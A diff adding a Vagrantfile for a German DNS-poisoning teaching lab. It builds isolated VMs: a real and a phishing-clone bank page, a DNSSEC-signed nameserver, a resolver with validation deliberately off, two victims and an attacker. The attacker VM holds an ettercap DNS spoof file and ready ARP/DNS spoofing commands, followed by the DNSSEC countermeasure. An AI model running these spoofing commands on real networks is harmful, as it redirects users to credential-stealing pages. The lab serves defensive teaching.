@@ -1,0 +1,538 @@
+# Lab 05 - DNS Poisoning
+# Funktioniert mit Hyper-V (Windows) UND VirtualBox (Windows/Linux/Mac).
+# Provider waehlen mit: vagrant up --provider=virtualbox
+#                    oder: vagrant up --provider=hyperv
+#
+# WICHTIG: v.vm.box und v.vm.network duerfen NICHT innerhalb eines
+# "v.vm.provider do |p| ... end"-Blocks stehen - siehe Lab 01 fuer die
+# ausfuehrliche Erklaerung, warum das sonst Box/Netzwerk doppelt registriert.
+#
+# Unterschied zum Original-Docker-Lab: dort musste der Angreifer-Container
+# komplett neu gestartet werden, um ip_forward umzuschalten (unter Docker
+# Desktop/WSL2 ist /proc/sys im Container read-only). In einer echten VM
+# geht das einfach per "sysctl -w" zur Laufzeit - deshalb gibt es hier nur
+# EINEN attacker, kein attacker/attacker-fwd-Paar.
+#
+# Boot-Reihenfolge (Vagrant startet Definitionen sequenziell):
+# web-real -> web-fake -> auth-dns -> resolver -> victim -> victim2 -> attacker
+# auth-dns signiert die Zone und stellt den Trust Anchor per einfachem
+# HTTP-Server (Port 8090) bereit, damit resolver ihn spaeter (beim
+# manuellen enable-dnssec.sh) abholen kann - ganz ohne Host-seitiges
+# Kopieren zwischen VMs, nach demselben Muster wie in Lab 03.
+
+provider = (ARGV.find { |a| a.start_with?("--provider=") } || "").split("=")[1] ||
+           ENV["VAGRANT_DEFAULT_PROVIDER"] || "virtualbox"
+
+BOX = provider == "hyperv" ? "ubuntu-secnet-hyperv" : "ubuntu-secnet-virtualbox"
+
+def net(vm, ip)
+  vm.vm.network "private_network",
+    hyperv__switch_name: "lab05-net",
+    virtualbox__intnet:  "lab05-net",
+    ip: ip
+end
+
+Vagrant.configure("2") do |config|
+
+  # ─── web-real: das echte Banking-Portal ──────────────────────────────────
+  config.vm.define "web-real" do |m|
+    m.vm.hostname = "web-real"
+    m.vm.synced_folder ".", "/vagrant", disabled: true
+    m.vm.box = BOX
+    net(m, "10.50.0.20")
+    m.vm.provider "hyperv" do |hv|
+      hv.vmname = "lab05-web-real"; hv.memory = 384; hv.cpus = 1
+    end
+    m.vm.provider "virtualbox" do |vb|
+      vb.name   = "lab05-web-real"; vb.memory = 384; vb.cpus = 1
+    end
+
+    m.vm.provision "shell", inline: <<-SHELL
+      set -e
+      apt-get update -qq
+      DEBIAN_FRONTEND=noninteractive apt-get install -y -qq nginx >/dev/null
+      cat > /var/www/html/index.html << 'HTMLEOF'
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <title>SicherBank - Online-Banking</title>
+  <style>
+    body{font-family:system-ui,sans-serif;background:#0a3d62;color:#fff;margin:0}
+    .wrap{max-width:420px;margin:8vh auto;background:#fff;color:#222;border-radius:12px;padding:32px;box-shadow:0 10px 40px rgba(0,0,0,.3)}
+    h1{color:#0a3d62;margin:0 0 4px}
+    .badge{display:inline-block;background:#e8f5e9;color:#2e7d32;font-size:13px;padding:3px 10px;border-radius:20px;margin-bottom:18px}
+    input{width:100%;padding:11px;margin:6px 0;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
+    button{width:100%;padding:12px;background:#0a3d62;color:#fff;border:0;border-radius:6px;font-size:15px;cursor:pointer}
+    .host{margin-top:18px;font-size:12px;color:#888;text-align:center}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>SicherBank</h1>
+    <span class="badge">ECHTES PORTAL - web-real - 10.50.0.20</span>
+    <p>Willkommen im Online-Banking. Bitte melden Sie sich an.</p>
+    <input placeholder="Kontonummer">
+    <input type="password" placeholder="PIN">
+    <button>Anmelden</button>
+    <div class="host">Server: web-real (10.50.0.20) -- bank.local</div>
+  </div>
+</body>
+</html>
+HTMLEOF
+      systemctl enable --now nginx
+      systemctl restart nginx
+      echo "[web-real] 10.50.0.20 | echtes Portal"
+    SHELL
+  end
+
+  # ─── web-fake: der Phishing-Klon ──────────────────────────────────────────
+  config.vm.define "web-fake" do |m|
+    m.vm.hostname = "web-fake"
+    m.vm.synced_folder ".", "/vagrant", disabled: true
+    m.vm.box = BOX
+    net(m, "10.50.0.99")
+    m.vm.provider "hyperv" do |hv|
+      hv.vmname = "lab05-web-fake"; hv.memory = 384; hv.cpus = 1
+    end
+    m.vm.provider "virtualbox" do |vb|
+      vb.name   = "lab05-web-fake"; vb.memory = 384; vb.cpus = 1
+    end
+
+    m.vm.provision "shell", inline: <<-SHELL
+      set -e
+      apt-get update -qq
+      DEBIAN_FRONTEND=noninteractive apt-get install -y -qq nginx >/dev/null
+      cat > /var/www/html/index.html << 'HTMLEOF'
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <title>SicherBank - Online-Banking</title>
+  <style>
+    body{font-family:system-ui,sans-serif;background:#0a3d62;color:#fff;margin:0}
+    .wrap{max-width:420px;margin:8vh auto;background:#fff;color:#222;border-radius:12px;padding:32px;box-shadow:0 10px 40px rgba(0,0,0,.3)}
+    h1{color:#0a3d62;margin:0 0 4px}
+    .badge{display:inline-block;background:#ffebee;color:#c62828;font-size:13px;padding:3px 10px;border-radius:20px;margin-bottom:18px}
+    input{width:100%;padding:11px;margin:6px 0;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
+    button{width:100%;padding:12px;background:#0a3d62;color:#fff;border:0;border-radius:6px;font-size:15px;cursor:pointer}
+    .host{margin-top:18px;font-size:12px;color:#c62828;text-align:center}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>SicherBank</h1>
+    <span class="badge">PHISHING-KLON - web-fake - 10.50.0.99</span>
+    <p>Willkommen im Online-Banking. Bitte melden Sie sich an.</p>
+    <input placeholder="Kontonummer">
+    <input type="password" placeholder="PIN">
+    <button>Anmelden</button>
+    <div class="host">Server: web-fake (10.50.0.99) -- Eingaben landen beim Angreifer</div>
+  </div>
+</body>
+</html>
+HTMLEOF
+      systemctl enable --now nginx
+      systemctl restart nginx
+      echo "[web-fake] 10.50.0.99 | Phishing-Klon"
+    SHELL
+  end
+
+  # ─── auth-dns: autoritativer Server fuer bank.local (DNSSEC-signiert) ────
+  config.vm.define "auth-dns" do |m|
+    m.vm.hostname = "auth-dns"
+    m.vm.synced_folder ".", "/vagrant", disabled: true
+    m.vm.box = BOX
+    net(m, "10.50.0.54")
+    m.vm.provider "hyperv" do |hv|
+      hv.vmname = "lab05-auth-dns"; hv.memory = 512; hv.cpus = 1
+    end
+    m.vm.provider "virtualbox" do |vb|
+      vb.name   = "lab05-auth-dns"; vb.memory = 512; vb.cpus = 1
+    end
+
+    m.vm.provision "shell", inline: <<-SHELL
+      set -e
+      apt-get update -qq
+      DEBIAN_FRONTEND=noninteractive apt-get install -y -qq nsd ldnsutils dnsutils python3 >/dev/null
+
+      mkdir -p /etc/nsd/zones
+      cat > /etc/nsd/nsd.conf << 'NSDEOF'
+server:
+    server-count: 1
+    ip-address: 0.0.0.0
+    port: 53
+    zonesdir: "/etc/nsd/zones"
+    logfile: ""
+    verbosity: 1
+    hide-version: yes
+
+zone:
+    name: "bank.local"
+    zonefile: "bank.local.zone.signed"
+NSDEOF
+
+      cat > /etc/nsd/zones/bank.local.zone << 'ZONEEOF'
+$ORIGIN bank.local.
+$TTL 60
+
+@   IN  SOA ns.bank.local. admin.bank.local. (
+        2026060401  ; Serial
+        3600        ; Refresh
+        900         ; Retry
+        604800      ; Expire
+        60 )        ; Minimum TTL
+
+@           IN  NS      ns.bank.local.
+ns          IN  A       10.50.0.54
+
+; ---- Das echte Banking-Portal (web-real) ----
+@           IN  A       10.50.0.20
+www         IN  A       10.50.0.20
+login       IN  A       10.50.0.20
+ZONEEOF
+
+      cd /etc/nsd/zones
+      KSK=$(ldns-keygen -a ECDSAP256SHA256 -k bank.local)
+      ZSK=$(ldns-keygen -a ECDSAP256SHA256 bank.local)
+      ldns-signzone bank.local.zone "$ZSK" "$KSK"
+      chown -R nsd:nsd /etc/nsd/zones
+
+      mkdir -p /shared
+      awk '/DNSKEY/ && $0 !~ /^;/ { sub(/;.*/,""); $1=$1; print; exit }' "${KSK}.key" > /shared/bank.local.ksk
+      echo "[auth-dns] Trust Anchor: $(cat /shared/bank.local.ksk)"
+
+      # systemd-resolved bindet standardmaessig auf 127.0.0.x:53. Ein
+      # 0.0.0.0-Bind von nsd deckt das Loopback-Interface trotzdem mit ab
+      # und kollidiert deshalb ("Address already in use") - erst jetzt
+      # deaktivieren, NACH apt-get (das braucht noch funktionierendes DNS
+      # ueber den NAT-Adapter).
+      systemctl disable --now systemd-resolved >/dev/null 2>&1 || true
+      rm -f /etc/resolv.conf
+      echo "nameserver 1.1.1.1" > /etc/resolv.conf
+
+      systemctl enable --now nsd
+      systemctl restart nsd
+
+      # Einfacher HTTP-Server, damit "resolver" den Trust Anchor spaeter
+      # (beim manuellen enable-dnssec.sh) abholen kann - kein Host-seitiges
+      # Kopieren zwischen VMs noetig, analog zum Zertifikats-Handoff in Lab 03.
+      cat > /etc/systemd/system/ksk-server.service << 'SVCEOF'
+[Unit]
+Description=Serve DNSSEC Trust Anchor fuer Lab 05
+After=network.target
+
+[Service]
+WorkingDirectory=/shared
+ExecStart=/usr/bin/python3 -m http.server 8090
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+      systemctl daemon-reload
+      systemctl enable --now ksk-server
+
+      cat > /etc/lab-info << 'LABEOF'
+=== Lab 05: DNS Poisoning ===
+auth-dns: 10.50.0.54 (nsd, Zone bank.local signiert)
+Trust Anchor abrufbar unter: http://10.50.0.54:8090/bank.local.ksk
+LABEOF
+
+      echo "[auth-dns] 10.50.0.54 | nsd bereit, Zone signiert"
+    SHELL
+  end
+
+  # ─── resolver: rekursiver, cachender Resolver (unbound) ──────────────────
+  config.vm.define "resolver" do |m|
+    m.vm.hostname = "resolver"
+    m.vm.synced_folder ".", "/vagrant", disabled: true
+    m.vm.box = BOX
+    net(m, "10.50.0.53")
+    m.vm.provider "hyperv" do |hv|
+      hv.vmname = "lab05-resolver"; hv.memory = 512; hv.cpus = 1
+    end
+    m.vm.provider "virtualbox" do |vb|
+      vb.name   = "lab05-resolver"; vb.memory = 512; vb.cpus = 1
+    end
+
+    m.vm.provision "shell", inline: <<-SHELL
+      set -e
+      apt-get update -qq
+      DEBIAN_FRONTEND=noninteractive apt-get install -y -qq unbound dnsutils curl >/dev/null
+
+      cat > /etc/unbound/unbound.conf << 'UBEOF'
+server:
+    interface: 0.0.0.0
+    port: 53
+    do-ip4: yes
+    do-udp: yes
+    do-tcp: yes
+    access-control: 10.50.0.0/24 allow
+    access-control: 127.0.0.0/8 allow
+
+    # Nur Iterator - KEINE Validierung. So akzeptiert der Resolver in
+    # Stufe 1+2 die gefaelschte (unsignierte) Antwort und legt sie im Cache ab.
+    module-config: "iterator"
+
+    cache-min-ttl: 0
+    cache-max-ttl: 86400
+    verbosity: 1
+    log-queries: yes
+    use-syslog: no
+    logfile: ""
+    chroot: ""
+    username: "unbound"
+    directory: "/etc/unbound"
+    pidfile: "/etc/unbound/unbound.pid"
+
+remote-control:
+    control-enable: yes
+    control-interface: 127.0.0.1
+    control-use-cert: no
+
+stub-zone:
+    name: "bank.local."
+    stub-addr: 10.50.0.54
+UBEOF
+
+      # Vorlage fuer Stufe 3 (mit DNSSEC-Validierung) - __TRUST_ANCHOR__ wird
+      # von enable-dnssec.sh zur Laufzeit ersetzt.
+      cat > /etc/unbound/unbound-dnssec.conf.tmpl << 'UBDEOF'
+server:
+    interface: 0.0.0.0
+    port: 53
+    do-ip4: yes
+    do-udp: yes
+    do-tcp: yes
+    access-control: 10.50.0.0/24 allow
+    access-control: 127.0.0.0/8 allow
+
+    module-config: "validator iterator"
+    val-permissive-mode: no
+    harden-dnssec-stripped: yes
+
+    cache-min-ttl: 0
+    cache-max-ttl: 86400
+    verbosity: 1
+    log-queries: yes
+    use-syslog: no
+    logfile: ""
+    chroot: ""
+    username: "unbound"
+    directory: "/etc/unbound"
+    pidfile: "/etc/unbound/unbound.pid"
+
+    trust-anchor: "__TRUST_ANCHOR__"
+
+remote-control:
+    control-enable: yes
+    control-interface: 127.0.0.1
+    control-use-cert: no
+
+stub-zone:
+    name: "bank.local."
+    stub-addr: 10.50.0.54
+UBDEOF
+
+      # Gleicher Konflikt wie bei auth-dns: systemd-resolved belegt Port 53
+      # auf Loopback, was den 0.0.0.0-Bind von unbound blockiert.
+      systemctl disable --now systemd-resolved >/dev/null 2>&1 || true
+      rm -f /etc/resolv.conf
+      echo "nameserver 1.1.1.1" > /etc/resolv.conf
+
+      systemctl enable --now unbound
+      systemctl restart unbound
+
+      cat > /usr/local/bin/enable-dnssec.sh << 'ENEOF'
+#!/bin/bash
+set -e
+TA=$(curl -sf http://10.50.0.54:8090/bank.local.ksk)
+if [ -z "$TA" ]; then
+  echo "FEHLER: Trust Anchor nicht abrufbar (laeuft auth-dns?)"; exit 1
+fi
+[ -f /etc/unbound/unbound.conf.nodnssec ] || cp /etc/unbound/unbound.conf /etc/unbound/unbound.conf.nodnssec
+sed "s|__TRUST_ANCHOR__|${TA}|" /etc/unbound/unbound-dnssec.conf.tmpl > /etc/unbound/unbound.conf
+unbound-control reload >/dev/null
+unbound-control flush_zone bank.local. >/dev/null 2>&1 || true
+echo "DNSSEC-Validierung AKTIV. Cache fuer bank.local geleert."
+echo "Trust Anchor: ${TA}"
+ENEOF
+      chmod +x /usr/local/bin/enable-dnssec.sh
+
+      cat > /usr/local/bin/disable-dnssec.sh << 'DISEOF'
+#!/bin/bash
+set -e
+if [ -f /etc/unbound/unbound.conf.nodnssec ]; then
+    cp /etc/unbound/unbound.conf.nodnssec /etc/unbound/unbound.conf
+fi
+unbound-control reload >/dev/null
+unbound-control flush_zone bank.local. >/dev/null 2>&1 || true
+echo "DNSSEC-Validierung DEAKTIVIERT (zurueck zu Stufe 1+2). Cache geleert."
+DISEOF
+      chmod +x /usr/local/bin/disable-dnssec.sh
+
+      cat > /usr/local/bin/enable-dot.sh << 'DOTEOF'
+#!/bin/bash
+set -e
+cd /etc/unbound
+[ -f dot.pem ] || openssl req -x509 -newkey rsa:2048 -nodes \\
+    -keyout dot.key -out dot.pem -days 365 \\
+    -subj "/CN=resolver.bank.local" >/dev/null 2>&1
+if ! grep -q "@853" /etc/unbound/unbound.conf; then
+    sed -i '/port: 53/a\\    interface: 0.0.0.0@853\\n    tls-service-key: "/etc/unbound/dot.key"\\n    tls-service-pem: "/etc/unbound/dot.pem"' /etc/unbound/unbound.conf
+fi
+unbound-control reload >/dev/null
+echo "DoT-Listener auf Port 853 aktiv."
+echo "Test vom victim:  kdig -d +tls @10.50.0.53 bank.local"
+DOTEOF
+      chmod +x /usr/local/bin/enable-dot.sh
+
+      cat > /etc/lab-info << 'LABEOF'
+=== Lab 05: DNS Poisoning ===
+resolver: 10.50.0.53 (unbound, Stufe 1+2: OHNE DNSSEC-Validierung)
+
+Umschalten:
+  sudo enable-dnssec.sh   -> Stufe 3 (Validierung AN)
+  sudo disable-dnssec.sh  -> zurueck zu Stufe 1+2
+  sudo enable-dot.sh      -> Bonus: DNS-over-TLS auf Port 853
+
+Cache pruefen:
+  unbound-control dump_cache | grep bank.local
+LABEOF
+
+      echo "[resolver] 10.50.0.53 | unbound bereit (ohne DNSSEC)"
+    SHELL
+  end
+
+  # ─── victim: Hauptopfer ────────────────────────────────────────────────
+  config.vm.define "victim" do |m|
+    m.vm.hostname = "victim"
+    m.vm.synced_folder ".", "/vagrant", disabled: true
+    m.vm.box = BOX
+    net(m, "10.50.0.10")
+    m.vm.provider "hyperv" do |hv|
+      hv.vmname = "lab05-victim"; hv.memory = 384; hv.cpus = 1
+    end
+    m.vm.provider "virtualbox" do |vb|
+      vb.name   = "lab05-victim"; vb.memory = 384; vb.cpus = 1
+    end
+
+    m.vm.provision "shell", inline: <<-SHELL
+      set -e
+      apt-get update -qq
+      DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl dnsutils >/dev/null
+
+      # Erst NACH der Paketinstallation (die braucht noch das normale NAT-DNS)
+      # auf unseren Resolver umstellen - sonst schlaegt apt-get fehl, weil
+      # 10.50.0.53 nicht ins Internet aufloest (Absicht).
+      systemctl disable --now systemd-resolved >/dev/null 2>&1 || true
+      rm -f /etc/resolv.conf
+      echo "nameserver 10.50.0.53" > /etc/resolv.conf
+
+      cat > /etc/lab-info << 'LABEOF'
+=== Lab 05: DNS Poisoning ===
+victim: 10.50.0.10 (Hauptopfer, DNS via 10.50.0.53)
+
+Test:
+  getent ahostsv4 bank.local
+  curl -4 -s bank.local | grep -E "badge|Server:"
+LABEOF
+
+      echo "[victim] 10.50.0.10 | DNS via 10.50.0.53"
+    SHELL
+  end
+
+  # ─── victim2: zweites Opfer (zeigt den Cache-Effekt) ─────────────────────
+  config.vm.define "victim2" do |m|
+    m.vm.hostname = "victim2"
+    m.vm.synced_folder ".", "/vagrant", disabled: true
+    m.vm.box = BOX
+    net(m, "10.50.0.11")
+    m.vm.provider "hyperv" do |hv|
+      hv.vmname = "lab05-victim2"; hv.memory = 384; hv.cpus = 1
+    end
+    m.vm.provider "virtualbox" do |vb|
+      vb.name   = "lab05-victim2"; vb.memory = 384; vb.cpus = 1
+    end
+
+    m.vm.provision "shell", inline: <<-SHELL
+      set -e
+      apt-get update -qq
+      DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl dnsutils >/dev/null
+      systemctl disable --now systemd-resolved >/dev/null 2>&1 || true
+      rm -f /etc/resolv.conf
+      echo "nameserver 10.50.0.53" > /etc/resolv.conf
+
+      cat > /etc/lab-info << 'LABEOF'
+=== Lab 05: DNS Poisoning ===
+victim2: 10.50.0.11 (zweites Opfer, zeigt Cache-Effekt in Szenario B)
+
+Test:
+  getent ahostsv4 bank.local
+LABEOF
+
+      echo "[victim2] 10.50.0.11 | DNS via 10.50.0.53"
+    SHELL
+  end
+
+  # ─── attacker ──────────────────────────────────────────────────────────
+  config.vm.define "attacker" do |m|
+    m.vm.hostname = "attacker"
+    m.vm.synced_folder ".", "/vagrant", disabled: true
+    m.vm.box = BOX
+    net(m, "10.50.0.66")
+    m.vm.provider "hyperv" do |hv|
+      hv.vmname = "lab05-attacker"; hv.memory = 512; hv.cpus = 1
+    end
+    m.vm.provider "virtualbox" do |vb|
+      vb.name   = "lab05-attacker"; vb.memory = 512; vb.cpus = 1
+    end
+
+    m.vm.provision "shell", inline: <<-SHELL
+      set -e
+      apt-get update -qq
+      DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ettercap-text-only tcpdump dnsutils net-tools iproute2 >/dev/null
+
+      # dsniff (arpspoof+dnsspoof) funktioniert auf dieser Ubuntu/VirtualBox-
+      # Kombination nicht zuverlaessig (Traffic laeuft nachweislich ueber den
+      # Angreifer, dnsspoof faengt ihn aber trotzdem nicht ab - vermutlich ein
+      # Kompatibilitaetsproblem des alten, kaum noch gepflegten dsniff-Pakets).
+      # Deshalb hier wie in Lab 02: ettercap uebernimmt ARP-Poisoning UND
+      # DNS-Spoofing in einem Tool (Plugin "dns_spoof"). ettercap kuemmert
+      # sich im arp:remote-Modus auch selbst um das Weiterleiten der Pakete -
+      # ein manuelles ip_forward-Umschalten ist damit nicht mehr noetig.
+      cat > /etc/ettercap/etter.dns << 'DNSEOF'
+bank.local       A   10.50.0.99
+www.bank.local   A   10.50.0.99
+login.bank.local A   10.50.0.99
+*.bank.local     A   10.50.0.99
+DNSEOF
+
+      cat > /etc/lab-info << 'LABEOF'
+=== Lab 05: DNS Poisoning ===
+attacker: 10.50.0.66
+
+  victim    10.50.0.10   resolver  10.50.0.53
+  victim2   10.50.0.11   auth-dns  10.50.0.54
+  web-real  10.50.0.20   web-fake  10.50.0.99
+
+ettercap uebernimmt ARP-Poisoning + DNS-Spoofing in einem Befehl (kein
+separates arpspoof/dnsspoof, kein ip_forward-Umschalten noetig).
+
+=== Szenario A (Angriff am Client) ===
+sudo ettercap -T -q -i enp0s8 -M arp:remote /10.50.0.10// /10.50.0.53// -P dns_spoof
+
+=== Szenario B (Angriff am Resolver) ===
+sudo ettercap -T -q -i enp0s8 -M arp:remote /10.50.0.53// /10.50.0.54// -P dns_spoof
+
+=== Szenario C (DNSSEC-Gegenmassnahme) ===
+# auf resolver: sudo enable-dnssec.sh
+# danach Szenario B wiederholen -> SERVFAIL statt Faelschung
+LABEOF
+
+      echo "[attacker] 10.50.0.66 | ettercap bereit (dns_spoof-Plugin konfiguriert)"
+    SHELL
+  end
+
+end
